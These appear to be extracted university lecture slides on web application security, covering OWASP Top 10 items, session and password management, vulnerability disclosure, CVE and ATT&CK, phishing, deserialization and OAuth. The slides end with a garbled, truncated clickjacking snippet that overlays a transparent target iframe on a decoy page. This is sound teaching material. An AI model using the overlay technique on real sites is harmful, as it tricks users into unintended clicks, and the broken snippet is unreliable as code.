    - Do not fix or upgrade the underlying platform, frameworks, and
       dependencies
    - Software developers do not test the compatibility of updated,
       upgraded, or patched libraries.
    - Do not secure the components’ configurations


### Mitigating Vulnerable and Outdated components

- Continuously monitor sources like Common Vulnerability and

```
Exposures (CVE) and National Vulnerability Database (NVD)
for vulnerabilities in the components.
```
- Obtain components from official sources over secure links.
- Monitor for libraries and components that are unmaintained
- Remove unused dependencies, unnecessary features,

```
components, files
```

`

## Identification and

## authentication failures

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### A07:2021 – Identification and authentication

### failures

- An application is vulnerable if:
    - Permits automated or brute force attacks such as credential
       stuffing
    - Permits default, weak, or well-known passwords
    - Use weak or ineffective credential recovery and forgot-
       password processes
    - Uses plain text, or weakly hashed passwords data stores
    - Missing or ineffective multi-factor authentication.
    - Exposes or reuses session identifier or does not correctly
       invalidate Session IDs


### Mitigating Identification and Authentication

### failures

- Password policy
- Account locking
- User rate limiting
- Session protection


`

## Logging, software and

## data integrity failures

## & SSRF

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### A08:2021-Software and data integrity failures

- It relates to code and infrastructure that does not protect against

```
integrity violations.
```
- Mitigation:
- Use digital signatures
    - Verify that components do not contain known vulnerabilities
    - Review process for code and configuration changes
    - CI/CD pipeline has proper segregation, configuration, and
       access control
    - Unsigned or unencrypted serialized data is not sent to
       untrusted


### A09:2021- Security logging and monitoring

### failures

- Security Logging and Monitoring helps to detect, escalate,

```
and respond to active breaches.
```
- Without logging and monitoring appropriate alerting

```
thresholds and response escalation processes are not in place
or effective.
```

### Mitigating security logging and monitoring

### failures

- Log and encode all log data related to all login, access

```
control, and server-side input validation failures with sufficient
user context
```
- High-value transactions should have an audit trail with

```
integrity controls
```
- Establish or adopt an incident response and recovery plan


### A10:2021-Server-Side Request Forgery

- It allows an attacker to coerce the application to send a

```
crafted request to an unexpected destination, even when
protected by a firewall, VPN, or another type of network
access control list
```

`

## Input validation

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Input Validation

- Input validation is performed:
    - To ensure only properly formed data enters the workflow
    - To prevent malformed data from persisting in the database
       and trigger malfunction of various downstream
       components.


### Implementing Input Validation

- Data type validators
    - Eg: Apache Commons Validators
- Type conversion
- Minimum and maximum value range check
- Array of allowed values
- Regular expressions


### Input Validation

- File Upload Validation
- Image Upload Verification
- Email Address Validation
    - Semantic Validation
    - Syntactic Validation


`

## Input validation - file

## upload vulnerability demo

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Input Validation in File Upload Vulnerability DVWA


`

## Session management

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Session management

- A web session is a sequence of network HTTP request and

```
response transactions associated with the same user.
```
- Current web applications can provide session capabilities

```
both pre and post authentication.
```

### Session management and access control

```
Source: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
```

### Session hijacking

- Disclosure, capture, prediction, brute force, or fixation of the

```
session ID will lead to session hijacking (or sidejacking) attacks
```
- Types of Session Hijacking:
    - Targeted
    - Generic.


## ` Session management

## (part II)

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Properties of session ID

- Session ID name fingerprinting
- Session ID length
- Session ID entropy
- Session ID content (or value)


### How cookies help secure session management

- The session ID exchange mechanism based on cookies
    provides multiple security features in the form of cookie
    attributes that can be used to protect the exchange of the
    session ID:
       - Secure attribute
       - HttpOnly attribute
       - SameSite attribute
       - Domain and path attributes
       - Expire and max-age attributes


`

## Database security

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Database security

- Database security is of critical importance due to:
    - The attractiveness of the target
    - The significant prevalence of SQL Injection vulnerabilities


### Securing a database

- Connecting to the database
    - Backend database used by the application should be
       isolated as much as possible
- Transport layer protection
- Authentication
- Storing database credentials
- Permissions
- Database configuration and hardening


`

## Password management

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Password Management

- Passwords are the next valuable targets for attackers after the

```
application or database is compromised
```
- Passwords are stored as password hashes rather than in the

```
encrypted format
```

### Password Storage Concepts

- Salting: A salt is a unique, randomly generated string that is added

```
to each password as part of the hashing process. Salting protects
against an attacker pre-computing hashes using rainbow tables or
database-based lookups
```
- Peppering: A pepper provides an additional layer of protection.

```
One of several peppering strategies is to hash the passwords as
usual and then HMAC or encrypt the hashes with a symmetrical
encryption key before storing the password hash in the database,
with the key acting as the pepper.
```
- The pepper is shared between stored passwords
- The pepper should not be stored in the database.
- Peppers are secrets and should be stored in secrets vault


### Password Hashing Algorithms

- Hashing is a one-way function and it is typically used for

```
password validation.
```
- Password hashing algorithms:
    - Argon2id
    - Scrypt
    - Bcrypt
    - PBKDF2


`

## Error handling &

## secure design

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Error handling

```
Image Courtesy: https://upload.wikimedia.org/wikipedia/commons/2/27/Pen-testing.jpg
```

### A sample stack trace

HTTP Status 500 - For input string: "null"
type Exception report message
For input string: "null" description The server encountered an internal error that prevented it
from fulfilling this request. exception java.lang.NumberFormatException: For input string:
"null“
java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
java.lang.Integer.parseInt(Integer.java:492) java.lang.Integer.parseInt(Integer.java:527)
sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
java.lang.reflect.Method.invoke(Method.java:606)
com.opensymphony.xwork2.DefaultActionInvocation.invokeAction(DefaultActionInvocation.java:450)
com.opensymphony.xwork2.DefaultActionInvocation.invokeActionOnly(DefaultActionInvocation.java:2
89) com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:252)
org.apache.struts2.interceptor.debugging.DebuggingInterceptor.intercept(DebuggingInterceptor.ja
va:256)
com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:246)

... note: The full stack trace of the root cause is available in the Apache Tomcat/7.0.56
logs.


### Error handling

```
Image Courtesy: https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html
```

### Secure product design

- The purpose of Secure Product Design is:
    - To ensure that all products meet or exceed the security
       requirements laid down by the organization as part of the
       development lifecycle and
    - To ensure that all security decisions made about the
       product being developed are explicit choices and result in
       the correct level of security for the product being
       developed


`

## Security principles

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Security principles

The principle of Least Privilege and Separation of Duties

- **Least Privilege** is a security principle that states that users should

```
only be given the minimum amount of access necessary to
perform their job. This helps to reduce the risk of unauthorized
access to sensitive data or systems, as users are only able to access
the resources they need.
```
- **Separation of duties** is a fundamental principle of internal control

```
in business and organizations. It is a system of checks and balances
that ensures that no single individual has control over all aspects of
a transaction. This helps to reduce the risk of fraud and errors, as
well as ensuring that all tasks are completed in a timely manner.
```

### Security principles

- **The principle of Defense-in-Depth** :It involves multiple layers of

```
security controls to protect an organization’s assets such that if
one layer of security fails, the other layers will still be able to
protect the asset. The layers of security can include physical
security, network security, application security, and data security.
```
- **The principle of Zero Trust:** It assumes that all users, devices, and

```
networks are untrusted and must be verified before access is
granted. It is based on the idea that organizations should not trust
any user, device, or network, even if they are inside the
organization’s network. Zero Trust also requires organizations to
continuously monitor and audit user activity to ensure that access
is only granted to those who need it.
```

### Security principles

- **The principle of Security-in-the-Open:** Security-in-the-Open

```
is a concept that emphasizes the importance of security in
open source software development. It focuses on the need for
developers to be aware of the security implications of their
code and to take steps to ensure that their code is secure.
```

### Security focus areas

- Context
- Components
- Connections
- Code
- Configuration


`

## Vulnerability disclosure

## methods

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Vulnerability disclosure

- Vulnerability disclosure is the practice of reporting security

```
flaws in computer software or hardware.
```
- The aim of vulnerability disclosure is to ensure that software or

```
hardware vendors can address vulnerabilities before bad
actors can find and exploit them
```
- Organizations initiate bug bounties, or vulnerability rewards

```
programs, which reward researchers for finding flaws, along
with internal code audits and penetration tests as part of an
organization's vulnerability management strategy.
```

### Methods of disclosure

- Private disclosure
- Full disclosure
- Responsible or coordinated disclosure


### Private disclosure

- In the private disclosure model, the vulnerability is reported

```
privately to the organization.
```
- The organization may choose to publish the details of the

```
vulnerabilities, but this is done at the discretion of the
organization, not the researcher, meaning that many
vulnerabilities may never be made public.
```
- The majority of bug bounty programs require that the

```
researcher follows this model.
```

### Full disclosure

- With the full disclosure approach, the full details of the

```
vulnerability are made public as soon as they are identified.
```
- This means that the full details (sometimes including exploit

```
code) are available to attackers, often before a patch is
available.
```

### Responsible or coordinated disclosure

- Responsible disclosure attempts to find a reasonable middle

```
ground between these two approaches.
```
- With responsible disclosure, the initial report is made

```
privately, but with the full details being published once a
patch has been made available
```

`

## Vulnerability disclosure

## process

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Bug Bounty Programs

- Bug bounty programs incentivize researchers to identify and

```
report vulnerabilities to organizations by offering rewards.
```
- The process is often managed through a third party such as

```
BugCrowd or HackerOne, who provide mediation between
researchers and organisations.
```

### Vulnerability disclosure process

- A researcher discovers a security vulnerability
- The researcher develops a vulnerability advisory report
- The researcher usually gives the vendor a reasonable period

```
to investigate
```
- Once a patch is available or the timeline for disclosure -- and

```
any extensions -- has elapsed, the researcher publishes a full-
disclosure vulnerability analysis of the exploit
```

### Security Advisory after Disclosure

- A high level summary of the vulnerability, including the impact.
- A clear list of vulnerable versions.
- A clear list of patch versions.
- Any caveats on when the software is vulnerable
- Any workarounds or mitigation that can be implemented as a

```
temporary fix.
```
- A CVE for the vulnerability.


`

## Phases of coordinated

## vulnerability disclosure

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Phases of coordinated vulnerability disclosure

```
Image Courtesy:https://vuls.cert.org/confluence/display/CVD/4.+Phases+of+CVD
```

### Microsoft’s approach to coordinated disclosure

- Researchers disclose newly discovered vulnerabilities in hardware,

```
software, and services directly to the vendors of the affected product; to a
national CERT or other coordinator who will report to the vendor privately;
or to a private service that will likewise report to the vendor privately
```
- The researcher allows the vendor the opportunity to diagnose and offer

```
fully tested updates, workarounds, or other corrective measures before any
party discloses detailed vulnerability or exploit information to the public.
```
- The vendor continues to coordinate with the researcher throughout the

```
vulnerability investigation and providesthe researcher with updates
```
- If attacks are underway in the wild, and the vendor is still working on the

```
update, then both the researcher and vendor work together as closely as
possible to provide early public vulnerability disclosure to protect
customers
```

### CVE

- CVE stands for Common Vulnerabilities and Exposures, and is

```
referred to as "a dictionary of publicly known information security
vulnerabilities and exposures."
```
- It is currently operated by MITRE Corporation under a contract

```
with the U.S. Dept. of Homeland Security.
```
- The vulnerabilities are discovered then assigned and published by

```
organizations from around the world that have partnered with the
CVE Program.
```
- When a new vulnerability is reported, MITRE researches the

```
vulnerability to determine the details. If the vulnerability appears
to be new, then a new CVE ID is assigned to the vulnerability for
use in future discussion and communications.
```

`

## Vulnerability disclosure

## & CVE

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### CVE Record Lifecycle

```
Image Courtesy: https://www.cve.org/About/Process
```

### National Vulnerability Database (NVD)

- The U.S. National Vulnerability Database (NVD) was launched

```
by the National Institute of Standards and Technology (NIST)
in 2005
```
- NVD is a vulnerability database built upon — and fully

```
synchronized with — the CVE List so that any updates to CVE
appear immediately in NVD.
```

### Common Vulnerability Scoring System (CVSS)

- The CVSS standard operated by the Forum of Incident Response
    and Security Teams (FIRST), which is a separate program from CVE,
    can be used to score the severity of software vulnerabilities
    identified by CVE Records.
- CVSS Version 3. 0 provides “a way to capture the principal
    characteristics of a vulnerability, and produce a numerical score
    reflecting its severity, as well as a textual representation of that
    score.
- The numerical score can then be translated into a qualitative
    representation (such as low, medium, high, and critical) to help
    organizations properly assess and prioritize their vulnerability
    management processes.”


### Common Weakness Enumeration (CWE™)

- CWE™ is a community-developed taxonomy of common

```
software and hardware security weaknesses that serves as a
common language, a measuring stick for security tools, and as
a baseline for weakness identification, mitigation, and
prevention efforts.
```
- Weaknesses in software and hardware may become

```
exploitable vulnerabilities if not eliminated prior to software or
hardware deployment. Weaknesses are a required data
element in a CVE Record.
```

`

## MITRE ATT&CK

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### ATT&CK®

- MITRE ATT&CK, which is an acronym for Adversarial Tactics,

```
Techniques, and Common Knowledge is a globally accessible
knowledge base of adversary tactics and techniques based on real-
world observations.
```
- The ATT&CK knowledge base is used as a foundation for the

```
development of specific threat models and methodologies in the
private sector, in government, and in the cybersecurity product and
service community.
```
- These techniques are indexed and break down into detail the exact

```
steps and methods that hackers use, making it easy for teams to
understand the actions that may be used against a particular
platform.
```

### ATT&CK matrix structure

```
Image Courtesy: https://www.rapid7.com/fundamentals/mitre-attack/
```

### Exploit-Db


`

## Phishing &

## Pharming attacks

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Phishing attacks

```
Image Courtesy: https://www.cloudflare.com/learning/access-management/phishing-
attack/#:~:text=%E2%80%9CPhishing%E2%80%9D%20refers%20to%20an%20attempt,or%20sell%20the%20stolen%20information.
```
- “Phishing” refers to an attempt to steal sensitive information

```
by masquerading as a reputable source with an enticing
request.
```

### Types of phishing attacks

- **Spear phishing** : is directed at specific individuals or

```
companies by gathering details or buying information about a
particular target so that an attacker is able to mount a
personalized scam
```
- **Clone phishing** : involves mimicking a previously delivered

```
legitimate email and modifying its links or attached files in
order to trick the victim into opening a malicious website or
file.
```
- **Whaling:** are attacks that are directed specifically at senior

```
executives or other privileged users within businesses
```

### Other phishing techniques

- SMS phishing, or smishing
- Voice phishing, or vishing
- Social media phishing
- Application or in-app messaging


### Pharming/DNS cache poisoning

- A pharming attack is a type of cyber attack that redirects a

```
website’s traffic to a malicious imposter site.
```
- Pharming attacks don’t require users to click on a malicious link;

```
pharms exist online, waiting for users to visit them and enter their
personal information.
```
- Scammers take an extra step to ensure that the URL of their fake

```
website stays the same as the legitimate one. Thus, the scam
happens in the background and is undetectable by most people.
```
- Pharming can be used to steal sensitive information, such as login

```
credentials or financial information.
```

### DNS Poisoning/ DNS spoofing

```
Image Courtesy: https://www.aura.com/learn/pharming-
attack#:~:text=A%20pharming%20attack%20is%20a,goes%20straight%20to%20the%20hackers.
```

`

## Insecure deserialization

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Serialization

- Serialization is the process of converting complex data structures,

```
such as objects and their fields, into a "flatter" format that can be
sent and received as a sequential stream of bytes.
```
- Serializing data makes it much simpler to:
    - Write complex data to inter-process memory, a file, or a
       database
    - Send complex data, for example, over a network, between
       different components of an application, or in an API call
- Deserialization is the process of restoring this byte stream to a

```
fully functional replica of the original object, in the exact state as
when it was serialized. The website's logic can then interact with
this deserialized object, just like it would with any other object.
```

### Insecure deserialization

- Insecure deserialization is when user-controllable data is

```
deserialized by a website. This potentially enables an attacker
to manipulate serialized objects in order to pass harmful data
into the application code
```
- Insecure deserialization is sometimes known as an "object

```
injection" vulnerability.
```

### PHP serialization format


### Lab on insecure deserialization


`

## OAuth

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### OAuth

- OAuth is an open-standard authorization protocol or

```
framework that describes how unrelated servers and services
can safely allow authenticated access to their assets without
actually sharing the initial, related, single login credential.
```
- It works by defining a series of interactions between three

```
distinct parties, namely a client application, a resource owner,
and the OAuth service provider.
```

### How does OAuth 2.0 work

- The client application requests access to a subset of the user's

```
data.
```
- The user is prompted to log in to the OAuth service and explicitly

```
give their consent for the requested access.
```
- The client application receives a unique access token that proves

```
they have permission from the user to access the requested data.
```
- The client application uses this access token to make API calls

```
fetching the relevant data from the resource server.
```

### OAuth authentication: Implicit Grant Type

```
Image Courtesy: https://portswigger.net/web-security/oauth/grant-types
```

### Vulnerability in Implicit Grant Type

```
Image Courtesy: https://portswigger.net/web-security/oauth/grant-types
```

### Demo


`

## Clickjacking

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Clickjacking

- Clickjacking, also known as a “UI redress attack”, is when an

```
attacker uses multiple transparent or opaque layers to trick a
user into clicking on a button or link on another page when
they were intending to click on the top level page.
```
- It is executed by using carefully crafted combination of

```
stylesheets, iframes, and text boxes.
```

### Constructing a basic clickjacking attack

head>
<style>
#target_website {
position:relative;
width:128px; height:128px;
opacity:0.00001; z-index:2;
}
#decoy_website
{ position:absolute;
width:300px;
height:400px;
z-index:1; }
</style>
</head> ...
<body>
<div id="website.com"> </decoy_websiteiframe"> ...decoy web content here... </div> <> iframe id="target_website" src="https://vulnerable-

```
</body>
```

